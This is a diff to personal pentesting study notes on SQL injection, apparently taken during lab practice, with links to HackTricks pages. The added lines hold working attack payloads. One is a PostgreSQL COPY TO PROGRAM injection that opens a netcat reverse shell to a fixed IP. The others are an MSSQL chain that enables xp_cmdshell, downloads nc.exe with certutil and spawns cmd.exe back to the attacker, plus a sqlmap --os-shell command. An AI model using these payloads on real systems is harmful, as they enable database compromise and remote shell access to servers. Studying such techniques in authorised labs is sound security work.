@@ -1,5 +1,7 @@
 [SQLMap - Cheetsheat - HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)
 [MySQL injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection)
+https://youtu.be/cx6Xs3F_1Uc?si=0xt_0UZibLEwjDk6
+
 ## SQL DB TYPES AND THEORY
 MySQL and Microsoft SQL Server (MSSQL) most common
 Identify the port using NMAP
@@ -196,3 +198,29 @@ try every field available for injection, and if it doen't work, try every field 
 
 ![[Pasted image 20231005201451.png]]
 no errors in **'ORDER%20BY%206--//**
+
+'; COPY (select null) TO PROGRAM 'nc -e /bin/sh 192.168.45.181 4444'; --
+
+
+CODE USE TO ACCESS THE MACHINE
+
+### Q7
+
+
+';EXEC sp_configure 'show advanced options', 1;--
+
+';RECONFIGURE;--
+
+';EXEC sp_configure "xp_cmdshell", 1;--
+
+';RECONFIGURE;--
+
+';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.181/nc.exe c:/windows/temp/nc.exe";--
+
+first start a listener in your kali
+
+nc -nlpv 443
+
+';EXEC xp_cmdshell "c:/windows/temp/nc.exe 192.168.45.181 443 -e cmd.exe";--
+
+└─$ sqlmap -r r**eq.txt** --os-shell --batch   --file from the POST that you save
